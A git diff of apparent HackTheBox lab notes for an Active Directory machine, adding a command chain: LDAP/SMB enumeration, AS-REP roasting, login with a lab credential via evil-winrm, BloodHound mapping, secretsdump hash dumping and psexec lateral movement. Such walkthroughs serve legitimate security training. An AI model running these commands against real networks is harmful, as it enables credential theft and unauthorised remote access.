@@ -1,4 +1,18 @@
 ```
+ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
+enum4linux 10.10.10.161
+./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
+crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+SharpHound.ps1
+BloodHound
+CanPSRemote
+secretsdump.py
+psexec.py / wmiexec.py
+```
+
+
+```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.161
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/09d1c960-d99a-4595-8c11-b9c0d1612465)
